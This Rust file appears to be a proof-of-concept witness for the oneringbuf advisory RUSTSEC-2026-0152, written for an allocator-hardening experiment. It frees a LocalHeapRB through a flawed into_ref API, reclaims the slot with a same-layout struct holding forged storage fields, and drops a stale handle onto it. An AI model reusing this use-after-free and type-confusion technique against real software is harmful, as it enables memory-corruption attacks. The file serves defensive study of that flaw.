//! Derived A -> free -> B adapter for RUSTSEC-2026-0152.
//!
//! The obsolete safe `IntoRef::into_ref` entry point creates an extra
//! `DroppableRef`. Dropping two handles reclaims its boxed 40-byte
//! `LocalHeapRB<usize>` while a third handle remains stale. A distinct,
//! same-layout `Replacement` is allocated before that final stale drop.
//! Address collision is the treatment-relevant oracle; a clean exit alone
//! never establishes that Type Isolation fixed the source defect.

use oneringbuf::{IntoRef, LocalHeapRB};
use std::hint::black_box;
use std::mem::{align_of, size_of, ManuallyDrop};

const VICTIM_TYPE_ID: u64 = 0x5253_4841_0000_0001;
const VICTIM_MODULE_ID: u64 = 0x5253_4841_0000_0002;
const VICTIM_ALLOC_CALLSITE: u64 = 0x5253_4841_0000_0003;
const VICTIM_RECLAIM_CALLSITE: u64 = 0x5253_4841_0000_0004;

// These hooks are no-ops in the standalone witness. The allocator experiment
// wrapper supplies the manually scoped victim identity and denial report.
pub(crate) fn with_vulnerability_edge_identity<R>(
    _type_id: u64,
    _module_id: u64,
    _callsite: u64,
    f: impl FnOnce() -> R,
) -> R {
    f()
}

pub(crate) fn report_vulnerability_edge_reuse_denial() {}

// This C layout matches the observed x86_64 layout of LocalHeapRB<usize>:
// HeapStorage pointer/length, producer/consumer indices, then alive_iters in
// the low byte of the final word. The private victim type has Rust layout, so
// the size/alignment assertions below remain part of this bounded adapter.
#[repr(C, align(8))]
struct Replacement {
    storage_pointer: usize,
    storage_length: usize,
    producer_index: usize,
    consumer_index: usize,
    alive_iters_word: usize,
}

fn main() {
    assert_eq!(size_of::<LocalHeapRB<usize>>(), 40);
    assert_eq!(align_of::<LocalHeapRB<usize>>(), 8);
    assert_eq!(size_of::<Replacement>(), 40);
    assert_eq!(align_of::<Replacement>(), 8);

    // The stale final drop interprets Replacement as LocalHeapRB<usize>. Give
    // its forged HeapStorage a valid allocation and set alive_iters to one so
    // that the stale drop deterministically consumes the replacement.
    let forged_storage = vec![0x5151_5151_5151_5151usize].into_boxed_slice();
    let storage_length = forged_storage.len();
    let storage_pointer = Box::into_raw(forged_storage) as *mut usize as usize;

    let rb = LocalHeapRB::<usize>::from(vec![1, 2, 3]);
    let r = crate::with_vulnerability_edge_identity(
        VICTIM_TYPE_ID,
        VICTIM_MODULE_ID,
        VICTIM_ALLOC_CALLSITE,
        || <LocalHeapRB<usize> as IntoRef>::into_ref(rb),
    );
    let original_address = (&*r as *const LocalHeapRB<usize>) as usize;
    let r2 = r.clone();
    let r3 = r.clone();

    drop(r);
    crate::with_vulnerability_edge_identity(
        VICTIM_TYPE_ID,
        VICTIM_MODULE_ID,
        VICTIM_RECLAIM_CALLSITE,
        || drop(r2),
    );

    let replacement = ManuallyDrop::new(Box::new(Replacement {
        storage_pointer,
        storage_length,
        producer_index: 0,
        consumer_index: 0,
        alive_iters_word: 1,
    }));
    crate::report_vulnerability_edge_reuse_denial();
    let replacement_address = (&**replacement as *const Replacement) as usize;
    eprintln!("original={original_address:#x} replacement={replacement_address:#x}");
    black_box(replacement_address);

    // Exercise the advisory's stale drop only when the allocator selected the
    // measured A-to-B collision.  A denied collision retains the stale source
    // defect, so leaking that final handle keeps the treatment arm focused on
    // the allocator decision instead of dereferencing unrelated freed bytes.
    if replacement_address == original_address {
        drop(r3);
    } else {
        std::mem::forget(r3);
    }
}
